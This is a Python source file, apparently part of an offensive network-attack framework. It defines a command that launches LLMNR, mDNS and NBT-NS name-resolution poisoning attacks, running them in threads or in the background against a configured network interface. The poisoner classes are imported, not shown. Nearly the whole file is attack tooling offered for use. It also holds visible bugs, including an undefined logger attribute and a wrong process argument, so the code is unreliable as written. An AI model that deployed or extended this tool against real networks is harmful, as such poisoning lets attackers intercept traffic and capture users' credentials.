#!/usr/bin/env python3
from .poisoners import MDNS
import argparse
from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
from threading import Thread
from multiprocessing import Process


from .poisoners import MDNS, NBT_NS, LLMNR


@with_default_category("Poisoning Attacks")
class PoisonSelector(CommandSet):
    def __init__(self):
        super().__init__()
        self.__poisoner_process = None

    def __create_mdns(self, args):
        """[ Method to configure mdns poisoner ]"""
        self.__mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
            self._cmd.info_logger,
        )
        if args.Asynchronous:
            self._cmd.info_logger.info("Running mdns poisoning in the background")
            self.__mdns_poisoner.logger_level = "DEBUG"

    def __create_nbt_ns(self, args):

        """[ Method to configure nbt_ns poisoner ]"""
        self.__nbt_ns_poisoner = NBT_NS(
            self._cmd.LHOST,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
            self.__info_logger,
        )
        if args.Asynchronous:

            self._cmd.info_logger.info("Running nbt_ns poisoning in the background")
            self.__nbt_ns_poisoner.logger_level = "DEBUG"

    def __create_llmnr(self, args):
        """[ Method to configure llmnr poisoner ]"""
        self.__llmnr_poisoner = LLMNR(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
            self._cmd.info_logger,
        )
        if args.Asynchronous:

            self._cmd.info_logger.info("Running llmnr poisoning in the background")
            self.__llmnr_poisoner.logger_level = "DEBUG"

    def __start_mdns(self):
        """[ Method to start the mdns poisoner]"""
        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True
        mdns_thread.start()

    def __start_llmnr(self):
        """[ Method to start the llmnr poisoner]"""
        llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
        llmnr_thread.daemon = True
        llmnr_thread.start()

    def __start_nbt_ns(self):
        """[ Method to start the nbt_ns poisoner]"""
        nbt_ns_thread = Thread(target=self.__nbt_ns_poisoner.start_nbt_ns_poisoning)
        nbt_ns_thread.daemon = True
        nbt_ns_thread.start()

    def __launch_attack(self, args):
        if args.mdns:
            self.__create_mdns(args)
            self.__start_mdns()
        if args.llmnr:
            self.__create_llmnr(args)
            self.__start_llmnr()
        if args.nbt_ns:
            self.__create_nbt_ns(args)
            self.__start_nbt_ns()

    argParser = Cmd2ArgumentParser(
        description="""Command to perform mdns poisoning attack"""
    )
    display_options = argParser.add_argument_group(
        " Arguments for displaying information "
    )
    display_options.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )
    run_options = argParser.add_argument_group(" Arguments for ways to run a program ")
    run_options.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background",
    )

    attack_options = argParser.add_argument_group(" Options to modify attack behavior")
    attack_options.add_argument(
        "-L",
        "--llmnr",
        action="store_true",
        help="To use llmnr poisoning",
    )
    attack_options.add_argument(
        "-M",
        "--mdns",
        action="store_true",
        help="To use MDNS poisoning",
    )
    attack_options.add_argument(
        "-N",
        "--nbt_ns",
        action="store_true",
        help="To use NBT_NS poisoning",
    )

    def do_poison_selector(self, args: argparse.Namespace) -> None:
        """[ Command to perform mdns poisoning attack ]

        Args:
            args (argparse.Namespace): [Arguments passed to the mdns poisoning attack ]
        """
        self._cmd.info_logger.debug(
            f"""Starting mdns poisoning attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
        }

        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):
            self.__poisoner_process = Process(target=self.__launch_attack, args=args)
            try:
                self.__poisoner_process.start()
                if not args.Asynchronous:
                    self.__poisoner_process.join()
            except KeyboardInterrupt:
                self.__poisoner_process.terminate()
                self.__poisoner_process.join()
